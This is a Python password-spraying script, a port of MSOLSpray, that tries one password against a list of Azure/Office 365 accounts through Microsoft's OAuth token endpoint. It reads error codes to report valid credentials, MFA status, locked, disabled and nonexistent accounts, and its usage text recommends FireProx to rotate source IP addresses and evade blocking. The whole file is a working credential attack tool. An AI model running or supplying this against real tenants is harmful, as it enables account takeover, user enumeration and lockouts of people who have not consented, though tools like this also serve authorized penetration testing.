import requests
import argparse
import time

description = """
This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!

This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
"""

epilog = """
EXAMPLE USAGE:
This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    python3 MSOLSpray.py --userlist ./userlist.txt --password Winter2020

This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
"""

parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)

parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
parser.add_argument("-p", "--password", required=True, help="A single password that will be used to perform the password spray. (Required)")
parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output valid results to.")
parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many seconds between tries")

args = parser.parse_args()

password = args.password
url = args.url
force = args.force
out = args.out
verbose = args.verbose
sleep = int(args.sleep)

usernames = []
with open(args.userlist, "r") as userlist:
    usernames = userlist.read().splitlines()

username_count = len(usernames)

print(f"There are {username_count} users in total to spray,")
print("Now spraying Microsoft Online.")
print(f"Current date and time: {time.ctime()}")

results = ""
username_counter = 0
lockout_counter = 0
lockout_question = False
for username in usernames:

    if username_counter>0:
        time.sleep(int(sleep))
        
    username_counter += 1
    print(f"{username_counter} of {username_count} users tested", end="\r")

    body = {
        'resource': 'https://graph.windows.net',
        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
        'client_info': '1',
        'grant_type': 'password',
        'username': username,
        'password': password,
        'scope': 'openid',
    }

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)

    if r.status_code == 200:
        print(f"SUCCESS! {username} : {password}")
        results += f"{username} : {password}\n"
    else:
        resp = r.json()
        error = resp["error_description"]

        if "AADSTS50126" in error:
            if verbose:
                print(f"VERBOSE: Invalid username or password. Username: {username} could exist.")
            continue

        elif "AADSTS50128" in error or "AADSTS50059" in error:
            print(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")

        elif "AADSTS50034" in error:
            print(f"WARNING! The user {username} doesn't exist.")

        elif "AADSTS50079" in error or "AADSTS50076" in error:
            # Microsoft MFA response
            print(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
            results += f"{username} : {password}\n"

        elif "AADSTS50158" in error:
            # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
            print(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
            results += f"{username} : {password}\n"

        elif "AADSTS50053" in error:
            # Locked out account or Smart Lockout in place
            print(f"WARNING! The account {username} appears to be locked.")
            lockout_counter += 1

        elif "AADSTS50057" in error:
            # Disabled account
            print(f"WARNING! The account {username} appears to be disabled.")

        elif "AADSTS50055" in error:
            # User password is expired
            print(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
            results += f"{username} : {password}\n"

        else:
            # Unknown errors
            print(f"Got an error we haven't seen yet for user {username}")
            print(error)


    # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
    if not force and lockout_counter == 10 and lockout_question == False:
        print("WARNING! Multiple Account Lockouts Detected!")
        print("10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?")
        yes = {'yes', 'y'}
        no = {'no', 'n', ''}
        lockout_question = True
        choice = "X"
        while(choice not in no and choice not in yes):
            choice = input("[Y/N] (default is N): ").lower()

        if choice in no:
            print("Cancelling the password spray.")
            print("NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.")
            break

        # else: continue even though lockout is detected

if out and results != "":
    with open(out, 'w') as out_file:
        out_file.write(results)
        print(f"Results have been written to {out}.")
